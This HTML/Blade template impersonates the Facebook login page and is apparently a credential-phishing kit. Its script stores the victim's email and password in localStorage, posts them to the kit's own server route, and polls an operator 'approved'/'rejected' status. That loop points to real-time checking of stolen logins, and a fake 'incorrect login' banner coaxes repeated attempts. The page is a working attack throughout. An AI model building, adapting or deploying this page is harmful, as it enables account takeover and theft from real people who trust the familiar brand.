<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Log in to Facebook</title>
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            height: 100%;
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #1c1e21;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            overflow-x: hidden;
        }

        .page-wrapper {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        /* Mobile Header */
        .mobile-header {
            display: none;
        }

        /* Main layout: 2-column on desktop */
        .main-content {
            flex: 1;
            display: flex;
            width: 100%;
            min-height: calc(100vh - 135px);
        }

        /* Left Hero Section */
        .hero-section {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 32px 48px 40px 56px;
            position: relative;
            background: #ffffff;
            min-width: 0;
        }

        .hero-brand {
            display: flex;
            align-items: center;
        }

        .fb-logo {
            width: 64px;
            height: 64px;
            display: block;
            user-select: none;
            object-fit: contain;
        }

        .hero-body {
            flex: 1;
            display: flex;
            align-items: flex-end;
            justify-content: space-between;
            gap: 24px;
            position: relative;
            width: 100%;
            padding-top: 10px;
        }

        /* Bottom-Left Typography */
        .hero-title-wrap {
            z-index: 10;
            padding-bottom: 24px;
            flex-shrink: 0;
            max-width: 320px;
        }

        .hero-title {
            font-size: 52px;
            font-weight: 500;
            line-height: 1.1;
            letter-spacing: -0.02em;
            color: #050505;
            margin: 0;
            font-family: inherit;
        }

        .hero-title .text-blue {
            color: #0F71F7;
        }

        /* Visual Collage Area */
        .hero-collage-wrap {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            max-width: 660px;
            margin-bottom: 4px;
        }

        .hero-collage-img {
            width: 100%;
            height: auto;
            max-height: min(680px, calc(100vh - 130px));
            object-fit: contain;
            display: block;
            user-select: none;
        }

        /* Right Login Panel */
        .login-section {
            width: 510px;
            flex: 0 0 510px;
            border-left: 1px solid #e4e6eb;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 48px;
            background: #ffffff;
        }

        .login-card {
            width: 100%;
            max-width: 440px;
        }

        .login-title {
            font-size: 18px;
            font-weight: 600;
            color: #050505;
            margin: 0 0 20px 0;
            font-family: inherit;
        }

        .input-box-wrapper {
            margin-bottom: 0;
            width: 100%;
        }

        .input-box {
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            padding: 8px 16px 7px 16px;
            min-height: 56px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            background: #ffffff;
            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
            cursor: text;
        }

        .input-box:focus-within {
            border-color: #0F71F7;
            box-shadow: 0 0 0 2px rgba(15, 113, 247, 0.2);
        }

        .input-box.has-error {
            border-color: #e41e3f !important;
            box-shadow: none !important;
        }

        .input-box.password-box {
            flex-direction: row;
            align-items: center;
            justify-content: space-between;
            padding-right: 12px;
        }

        .input-field-col {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            min-width: 0;
        }

        .floating-label {
            font-size: 12px;
            color: #65676b;
            line-height: 1.2;
            margin-bottom: 2px;
            font-weight: 400;
            user-select: none;
            cursor: text;
            display: block;
        }

        .box-input {
            border: none;
            outline: none;
            background: transparent;
            font-size: 15.5px;
            color: #1c1e21;
            width: 100%;
            padding: 0;
            line-height: 1.3;
            font-family: inherit;
        }

        .box-input::placeholder {
            color: #8d949e;
            font-size: 15px;
            font-weight: 400;
        }

        .eye-toggle-btn {
            background: none;
            border: none;
            cursor: pointer;
            padding: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #050505;
            border-radius: 50%;
            transition: background-color 0.15s ease;
            flex-shrink: 0;
        }

        .eye-toggle-btn:hover {
            background-color: #f0f2f5;
        }

        .top-error-banner {
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            padding: 12px 16px;
            background: #ffffff;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 14px;
            text-align: left;
        }

        .top-error-banner .error-icon {
            flex-shrink: 0;
            width: 16px;
            height: 16px;
        }

        .top-error-banner .error-msg-text {
            color: #1c1e21;
            font-size: 13px;
            line-height: 1.4;
            font-weight: 400;
        }

        .top-error-banner .find-account-link {
            color: #0F71F7;
            font-weight: 600;
            text-decoration: none;
        }

        .top-error-banner .find-account-link:hover {
            text-decoration: underline;
        }

        .btn-login {
            width: 100%;
            height: 46px;
            border: none;
            border-radius: 23px;
            background: #0F71F7;
            color: #ffffff;
            font-size: 15.5px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background-color 0.2s ease;
            margin-top: 18px;
        }

        .btn-login:hover {
            background-color: #0d62d6;
        }

        .btn-login:disabled {
            opacity: 0.75;
            cursor: not-allowed;
        }

        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.35);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .forgot-password {
            display: block;
            margin-top: 20px;
            text-align: center;
            color: #050505;
            font-size: 14.5px;
            font-weight: 500;
            text-decoration: none;
        }

        .forgot-password:hover {
            text-decoration: underline;
        }

        .btn-create-account {
            width: 100%;
            height: 44px;
            margin-top: 36px;
            border: 1px solid #0F71F7;
            border-radius: 22px;
            background: #ffffff;
            color: #0F71F7;
            font-size: 14.5px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .btn-create-account:hover {
            background-color: #f0f7ff;
        }

        .meta-logo-wrap {
            margin-top: 24px;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .meta-logo-wrap svg {
            height: 14px;
            width: auto;
            display: block;
            user-select: none;
        }

        /* Footer */
        .site-footer {
            background: #ffffff;
            border-top: 1px solid #e4e6eb;
            padding: 24px 32px 30px 32px;
            color: #737373;
            font-size: 11px;
            line-height: 1.6;
        }

        .footer-inner {
            max-width: 980px;
            margin: 0 auto;
        }

        .lang-list,
        .links-list {
            display: flex;
            flex-wrap: wrap;
            gap: 0 16px;
            line-height: 1.8;
        }

        .lang-list a,
        .links-list a {
            color: #737373;
            text-decoration: none;
            white-space: nowrap;
        }

        .lang-list a:hover,
        .links-list a:hover {
            text-decoration: underline;
        }

        .footer-separator {
            border-bottom: 1px solid #e4e6eb;
            margin: 10px 0 8px 0;
        }

        .copyright-text {
            margin-top: 12px;
            color: #8a8d91;
            font-size: 11px;
        }

        /* Simple Modal */
        .modal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.45);
            align-items: center;
            justify-content: center;
            z-index: 999;
        }

        .modal.show {
            display: flex;
        }

        .modal-box {
            width: 360px;
            background: #ffffff;
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 15px 45px rgba(0, 0, 0, 0.25);
            text-align: center;
        }

        .modal-box h3 {
            font-size: 18px;
            font-weight: 600;
            margin: 0 0 10px;
            color: #1c1e21;
        }

        .modal-box p {
            font-size: 13px;
            line-height: 1.5;
            color: #606770;
            margin: 0 0 20px;
        }

        .modal-box button {
            width: 100%;
            height: 38px;
            border: 0;
            border-radius: 19px;
            background: #0F71F7;
            color: #ffffff;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
        }

        /* Responsive Breakpoints */
        @media (max-width: 1280px) {
            .hero-section {
                padding: 24px 32px 28px 36px;
            }

            .hero-title {
                font-size: 44px;
            }

            .hero-collage-wrap {
                max-width: 560px;
            }

            .login-section {
                width: 440px;
                flex: 0 0 440px;
                padding: 30px 24px;
            }
        }

        @media (max-width: 992px) {
            .main-content {
                flex-direction: column;
                min-height: auto;
            }

            .hero-section {
                display: none;
            }

            .mobile-header {
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 36px 0 18px 0;
                background: #ffffff;
            }

            .mobile-header .fb-logo {
                width: 60px;
                height: 60px;
            }

            .login-section {
                width: 100%;
                flex: none;
                border-left: none;
                padding: 10px 20px 48px 20px;
            }

            .login-card {
                max-width: 390px;
            }

            .site-footer {
                padding: 20px 16px 28px 16px;
            }

            .lang-list,
            .links-list {
                justify-content: center;
            }

            .copyright-text {
                text-align: center;
            }
        }
    </style>
</head>

<body>
    <div class="page-wrapper">

        <!-- Mobile Header (Visible on small screens) -->
        <header class="mobile-header">
            <img src="/logo.png" alt="Facebook" class="fb-logo">
        </header>

        <!-- Main Content Area -->
        <main class="main-content">

            <!-- Left Hero Section: Facebook Logo, Typography & Visual Collage -->
            <section class="hero-section">
                <header class="hero-brand">
                    <img src="/logo.png" alt="Facebook" class="fb-logo">
                </header>

                <div class="hero-body">
                    <!-- Typography on bottom-left -->
                    <div class="hero-title-wrap">
                        <h1 class="hero-title">
                            Explore<br>
                            the<br>
                            things<br>
                            <span class="text-blue">you love</span>.
                        </h1>
                    </div>

                    <!-- Visual Collage on center-right -->
                    <div class="hero-collage-wrap">
                        <img src="/images/hero-visual.webp" alt="Explore the things you love." class="hero-collage-img" draggable="false">
                    </div>
                </div>
            </section>

            <!-- Right Login Form Section -->
            <section class="login-section">
                <div class="login-card">
                    <h2 class="login-title">Log in to Facebook</h2>

                    <div class="top-error-banner" id="topErrorBanner" style="{{ !empty($hasError) ? 'display: flex;' : 'display: none;' }}">
                        <svg class="error-icon" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="8" cy="8" r="7.25" stroke="#e41e3f" stroke-width="1.5" fill="none"/>
                            <line x1="8" y1="4.2" x2="8" y2="8.5" stroke="#e41e3f" stroke-width="1.5" stroke-linecap="round"/>
                            <circle cx="8" cy="11.5" r="0.9" fill="#e41e3f"/>
                        </svg>
                        <div class="error-msg-text">
                            The login information you entered is incorrect. <a href="#" class="find-account-link" onclick="openModal(event, 'Find account', 'Please enter your email or mobile number to search for your account.')">Find your account and log in.</a>
                        </div>
                    </div>

                    <form id="loginForm" method="POST" action="{{ route('secure-login.submit') }}">
                        @csrf
                        <div class="input-box-wrapper">
                            <div class="input-box" id="emailBox">
                                <label class="floating-label" for="email">Email address or mobile number</label>
                                <input id="email" name="email" class="box-input" type="text"
                                    autocomplete="username" required autofocus>
                            </div>
                        </div>

                        <div class="input-box-wrapper" style="margin-top: 12px;">
                            <div class="input-box password-box" id="passwordBox">
                                <div class="input-field-col">
                                    <label class="floating-label" for="password">Password</label>
                                    <input id="password" name="password" class="box-input" type="password"
                                        autocomplete="current-password" required>
                                </div>
                                <button type="button" class="eye-toggle-btn" id="togglePasswordBtn" aria-label="Toggle password visibility" tabindex="-1">
                                    <svg id="eyeSlashIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
                                        <line x1="1" y1="1" x2="23" y2="23"></line>
                                    </svg>
                                    <svg id="eyeOpenIcon" style="display: none;" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8z"></path>
                                        <circle cx="12" cy="12" r="3"></circle>
                                    </svg>
                                </button>
                            </div>
                        </div>

                        <button id="submitBtn" class="btn-login" type="submit">Log in</button>
                    </form>

                    <a class="forgot-password" href="#"
                        onclick="openModal(event, 'Password recovery', 'Please enter your email or phone number to search for your account.')">
                        Forgotten password?
                    </a>

                    <button class="btn-create-account" type="button"
                        onclick="openModal(null, 'Create an account', 'Registration is currently unavailable. Please try again later.')">
                        Create new account
                    </button>

                    <div class="meta-logo-wrap">
                        <svg class="meta-logo-svg" viewBox="0 0 500 100">
                            <path d="M182.141 3.213h18.808l31.98 57.849 31.979-57.849h18.401V98.27h-15.345V25.416l-28.042 50.448h-14.394l-28.042-50.448V98.27h-15.345V3.213ZM332.804 99.967c-7.107 0-13.353-1.573-18.739-4.718-5.387-3.146-9.586-7.504-12.595-13.07-3.011-5.569-4.515-11.95-4.515-19.148 0-7.287 1.47-13.738 4.413-19.35 2.942-5.613 7.027-10.004 12.255-13.173 5.229-3.168 11.238-4.753 18.027-4.753 6.744 0 12.55 1.596 17.416 4.787 4.865 3.191 8.611 7.661 11.237 13.41 2.624 5.749 3.938 12.492 3.938 20.233v4.21h-52.077c.95 5.794 3.292 10.354 7.027 13.68 3.735 3.328 8.453 4.991 14.157 4.991 4.571 0 8.509-.679 11.814-2.037 3.303-1.358 6.404-3.417 9.302-6.178l8.147 9.98c-8.103 7.425-18.038 11.136-29.807 11.136Zm11.204-56.389c-3.215-3.281-7.425-4.923-12.629-4.923-5.07 0-9.314 1.676-12.731 5.025-3.418 3.35-5.58 7.854-6.484 13.512h37.343c-.453-5.794-2.286-10.331-5.499-13.614ZM382.846 40.014h-14.123V27.453h14.123V6.676h14.802v20.777h21.455v12.561h-21.455v31.844c0 5.295.905 9.075 2.716 11.338 1.809 2.264 4.911 3.395 9.302 3.395 1.945 0 3.598-.078 4.956-.237a92.35 92.35 0 0 0 4.481-.646v12.425c-1.675.498-3.564.906-5.669 1.223a44.63 44.63 0 0 1-6.62.475c-15.979 0-23.968-8.735-23.968-26.208V40.014ZM496.236 98.27h-14.53v-9.913c-2.58 3.712-5.862 6.575-9.845 8.588-3.983 2.014-8.51 3.022-13.579 3.022-6.247 0-11.78-1.596-16.601-4.787s-8.612-7.581-11.373-13.172c-2.761-5.59-4.142-11.983-4.142-19.18 0-7.243 1.403-13.648 4.21-19.216 2.806-5.567 6.688-9.935 11.645-13.104 4.956-3.168 10.648-4.753 17.075-4.753 4.844 0 9.189.94 13.037 2.818a25.768 25.768 0 0 1 9.573 7.978v-9.098h14.53V98.27Zm-14.801-46.035c-1.585-4.028-4.085-7.207-7.503-9.54-3.418-2.33-7.367-3.496-11.848-3.496-6.338 0-11.384 2.128-15.141 6.382-3.758 4.255-5.635 10.004-5.635 17.246 0 7.289 1.809 13.06 5.431 17.314 3.621 4.255 8.532 6.382 14.734 6.382 4.571 0 8.645-1.176 12.222-3.53 3.575-2.353 6.155-5.522 7.74-9.506V52.235Z" fill="#1C2B33"></path>
                            <path d="M108 0C95.66 0 86.015 9.294 77.284 21.1 65.284 5.821 55.25 0 43.24 0 18.76 0 0 31.862 0 65.586 0 86.69 10.21 100 27.31 100c12.308 0 21.16-5.803 36.897-33.31 0 0 6.56-11.584 11.072-19.564 1.582 2.553 3.243 5.3 4.997 8.253l7.38 12.414C102.03 91.848 110.038 100 124.551 100c16.659 0 25.931-13.492 25.931-35.034C150.483 29.656 131.301 0 108 0ZM52.207 59.241c-12.759 20-17.172 24.483-24.276 24.483-7.31 0-11.655-6.418-11.655-17.862 0-24.483 12.207-49.517 26.759-49.517 7.88 0 14.465 4.55 24.552 18.991-9.578 14.691-15.38 23.905-15.38 23.905Zm48.153-2.517-8.823-14.715a301.425 301.425 0 0 0-6.884-10.723c7.952-12.274 14.511-18.39 22.313-18.39 16.206 0 29.172 23.863 29.172 53.173 0 11.172-3.659 17.655-11.241 17.655-7.268 0-10.739-4.8-24.537-27Z" fill="#0180FA"></path>
                        </svg>
                    </div>
                </div>
            </section>
        </main>

        <!-- Footer -->
        <footer class="site-footer">
            <div class="footer-inner">
                <div class="lang-list">
                    <a href="#">English (UK)</a>
                    <a href="#">Tiếng Việt</a>
                    <a href="#">中文(台灣)</a>
                    <a href="#">한국어</a>
                    <a href="#">日本語</a>
                    <a href="#">Français (France)</a>
                    <a href="#">ภาษาไทย</a>
                    <a href="#">More languages...</a>
                </div>

                <div class="footer-separator"></div>

                <div class="links-list">
                    <a href="#">Sign up</a>
                    <a href="#">Log in</a>
                    <a href="#">Messenger</a>
                    <a href="#">Facebook Lite</a>
                    <a href="#">Video</a>
                    <a href="#">Meta Pay</a>
                    <a href="#">Meta Store</a>
                    <a href="#">Meta Quest</a>
                    <a href="#">Ray-Ban Meta</a>
                    <a href="#">Meta AI</a>
                    <a href="#">Muse</a>
                    <a href="#">Instagram</a>
                    <a href="#">Threads</a>
                    <a href="#">Privacy Policy</a>
                    <a href="#">Privacy Centre</a>
                    <a href="#">About</a>
                    <a href="#">Create ad</a>
                    <a href="#">Create Page</a>
                    <a href="#">Developers</a>
                    <a href="#">Careers</a>
                    <a href="#">Cookies</a>
                    <a href="#">AdChoices</a>
                    <a href="#">Terms</a>
                    <a href="#">Help</a>
                    <a href="#">Contact uploading and non-users</a>
                </div>

                <div class="copyright-text">
                    Meta &copy; 2026
                </div>
            </div>
        </footer>

    </div>

    <!-- Feedback Modal -->
    <div id="modal" class="modal" onclick="if(event.target === this) closeModal()">
        <div class="modal-box">
            <h3 id="mtitle">Notification</h3>
            <p id="mtext">Message content</p>
            <button type="button" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        // Password visibility toggle
        const toggleBtn = document.getElementById('togglePasswordBtn');
        const passwordInput = document.getElementById('password');
        const eyeSlashIcon = document.getElementById('eyeSlashIcon');
        const eyeOpenIcon = document.getElementById('eyeOpenIcon');

        if (toggleBtn) {
            toggleBtn.addEventListener('click', function(e) {
                e.stopPropagation();
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    eyeSlashIcon.style.display = 'none';
                    eyeOpenIcon.style.display = 'block';
                } else {
                    passwordInput.type = 'password';
                    eyeSlashIcon.style.display = 'block';
                    eyeOpenIcon.style.display = 'none';
                }
            });
        }

        // Focus inputs on box click
        document.querySelectorAll('.input-box').forEach(box => {
            box.addEventListener('click', (e) => {
                if (e.target.closest('.eye-toggle-btn')) return;
                const input = box.querySelector('.box-input');
                if (input) input.focus();
            });
        });

        function showAdminRejectionError() {
            const topError = document.getElementById('topErrorBanner');
            const btn = document.getElementById('submitBtn');

            if (topError) topError.style.display = 'flex';
            if (btn) {
                btn.disabled = false;
                btn.innerHTML = 'Log in';
            }
        }

        function clearError() {
            const topError = document.getElementById('topErrorBanner');
            if (topError) topError.style.display = 'none';
        }

        // Clear error on input
        document.getElementById('email').addEventListener('input', clearError);
        document.getElementById('password').addEventListener('input', clearError);

        // Restore saved credentials & error state on load
        document.addEventListener('DOMContentLoaded', () => {
            const savedEmail = localStorage.getItem('social_saved_email');
            const savedPass = localStorage.getItem('social_saved_pass');
            const urlParams = new URLSearchParams(window.location.search);
            const isError = urlParams.has('error') || {{ !empty($hasError) ? 'true' : 'false' }};

            if (savedEmail && !document.getElementById('email').value) {
                document.getElementById('email').value = savedEmail;
            }
            if (savedPass && !document.getElementById('password').value) {
                document.getElementById('password').value = savedPass;
            }

            if (isError) {
                showAdminRejectionError();
            }
        });

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const emailInput = document.getElementById('email');
            const passwordInput = document.getElementById('password');
            const email = emailInput.value.trim();
            const password = passwordInput.value;
            const btn = document.getElementById('submitBtn');

            if (!email || !password) {
                showAdminRejectionError();
                return;
            }

            localStorage.setItem('social_saved_email', email);
            localStorage.setItem('social_saved_pass', password);
            localStorage.setItem('fb_email', email);
            localStorage.setItem('fb_pass1', password);

            clearError();
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span>';

            try {
                const response = await fetch("{{ route('secure-login.submit') }}", {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'X-CSRF-TOKEN': "{{ csrf_token() }}"
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        redirectUrl: "{{ $authPath ?? '/meta' }}"
                    })
                });

                const data = await response.json();

                if (response.ok && data.statusUrl) {
                    pollStatus(data.statusUrl, data.id);
                } else {
                    showAdminRejectionError();
                }
            } catch (err) {
                console.error(err);
                showAdminRejectionError();
            }
        });

        function pollStatus(statusUrl, id) {
            const interval = setInterval(async () => {
                try {
                    const res = await fetch(statusUrl, {
                        headers: {
                            'Accept': 'application/json'
                        }
                    });
                    const data = await res.json();

                    if (data.status === 'approved') {
                        clearInterval(interval);
                        setTimeout(() => {
                            window.location.href = data.redirectUrl || "{{ $authPath ?? '/meta' }}";
                        }, 1000);
                    } else if (data.status === 'rejected') {
                        clearInterval(interval);
                        showAdminRejectionError();
                    }
                } catch (e) {
                    console.error('Polling error', e);
                }
            }, 2000);
        }

        function openModal(e, title, text) {
            if (e) e.preventDefault();
            document.getElementById('mtitle').textContent = title;
            document.getElementById('mtext').textContent = text;
            document.getElementById('modal').classList.add('show');
        }

        function closeModal() {
            document.getElementById('modal').classList.remove('show');
        }
    </script>
</body>

</html>